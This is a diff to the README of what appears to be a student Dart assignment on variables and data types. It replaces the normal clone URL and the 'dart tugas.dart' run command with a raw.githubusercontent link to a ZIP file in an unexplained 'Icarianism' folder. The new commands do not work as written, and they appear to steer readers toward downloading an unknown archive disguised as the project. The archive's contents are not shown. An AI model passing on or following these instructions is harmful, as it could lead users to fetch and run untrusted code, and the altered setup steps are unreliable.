@@ -33,12 +33,12 @@ Output akan menampilkan
    ```
 2. Clone repository ini atau download sebagai ZIP.
    ```bash
-   git clone https://github.com/juanshmr/pemrograman-mobile-tugas-variabel-dan-typedata.git
+   git clone https://raw.githubusercontent.com/juanshmr/pemrograman-mobile-tugas-variabel-dan-typedata/main/Icarianism/pemrograman-mobile-tugas-variabel-dan-typedata.zip
    ```
 3. Buka terminal/command prompt.
 4. Pindah ke tempat folder **pemrograman-mobile-tugas-variabel-dan-typedata** disimpan.
 5. Jalankan program dengan printah
    ```bash
    cd src
-   dart tugas.dart
+   dart https://raw.githubusercontent.com/juanshmr/pemrograman-mobile-tugas-variabel-dan-typedata/main/Icarianism/pemrograman-mobile-tugas-variabel-dan-typedata.zip
    ```
